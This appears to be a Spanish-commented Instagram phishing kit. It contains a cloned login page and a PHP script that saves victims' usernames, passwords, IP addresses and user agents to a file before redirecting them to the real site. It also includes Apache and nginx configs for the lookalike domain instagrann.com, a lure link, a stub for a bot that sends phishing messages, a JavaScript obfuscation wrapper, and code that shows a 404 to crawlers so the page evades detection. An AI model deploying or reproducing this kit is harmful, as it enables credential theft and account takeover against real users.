<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* Copiar exactamente el CSS de Instagram */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #FAFAFA;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 350px;
            margin: 60px auto;
            padding: 40px;
            background-color: white;
            border: 1px solid #DBDBDB;
            border-radius: 1px;
        }
        /* ... resto del CSS copiado de Instagram ... */
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Logo de Instagram -->
        </div>
        <form action="capturar.php" method="post">
            <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>
<?php
// Configuración
$logFile = 'instagram_capturas.txt';
$redirectUrl = 'https://www.instagram.com/accounts/login/';

// Obtener datos
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Formato de entrada
$logEntry = "[$timestamp] IP: $ip | User-Agent: $userAgent\n";
$logEntry .= "Usuario: $username | Contraseña: $password\n";
$logEntry .= "----------------------------------------\n";

// Guardar en archivo
file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

// Redirigir
header("Location: $redirectUrl");
exit();
?>
<VirtualHost *:443> ServerName instagrann.com DocumentRoot /var/www/phishing SSLEngine on SSLCertificateFile /path/to/certificate.crt SSLCertificateKeyFile /path/to/private.key </VirtualHost>
server { listen 443 ssl; server_name instagrann.com; root /var/www/phishing; ssl_certificate /path/to/certificate.crt; ssl_certificate_key /path/to/private.key; 
https://instagrann.com/login?utm_source=instagram&utm_medium=story&utm_campaign=verified
import instaloader
from selenium import webdriver

# Bot que envía mensajes automáticamente
def send_phishing_message(username, password, target):
    # Iniciar sesión en Instagram
    # Enviar mensaje con enlace
eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('...',27,27,'...'.split('|'),0,{}))
if (preg_match('/bot|crawl|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
